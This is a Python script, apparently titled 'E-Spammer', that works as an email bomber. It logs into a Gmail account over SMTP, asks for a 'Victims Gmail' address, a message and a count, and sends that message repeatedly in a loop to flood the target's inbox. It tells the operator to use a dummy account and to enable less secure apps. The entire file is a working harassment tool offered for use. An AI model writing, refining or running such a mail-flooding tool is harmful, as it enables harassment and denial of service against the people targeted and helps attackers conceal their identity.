import smtplib, time, os, sys
from time import sleep
from sys import platform
##BANNER##
def banner():
    print("███████╗    ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ ")
    print("██╔════╝    ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗")
    print("█████╗█████╗███████╗██████╔╝███████║██╔████╔██║██╔████╔██║██████╗ ██████╔╝")
    print("██╔══╝╚════╝╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ ██╔══██╗")
    print("███████╗    ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║")
    print("╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝")
##CODE##
if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "win32":
    os.system('cls')
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
port = 587
banner()
print("                          ~~~~USE A DUMMY GMAIL~~~~")
print("              ~~~~MAKE SURE TO ALSO TURN ON LESS SECURE APPS!~~~~")
print("                         ~~~~Made By StugotsZach~~~~")
print("Your Gmail Address: ")
gmail = input("")

print("Password: ")
password = input("")

if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "win32":
    os.system('cls')
banner()
print("Victims Gmail: ")
victim = input("")

print("Message: ")
message = input("")

print("Number of emails to send: ")
total = int(input(""))

if platform == "linux" or platform == "linux2":
    os.system('clear')
elif platform == "win32":
    os.system('cls')

server.login(gmail,password)

for i in range(int(total)):
    server.sendmail(gmail,victim,message)
server.quit()
print("Sent E-mails to: " + victim)
sleep(2)
exit()
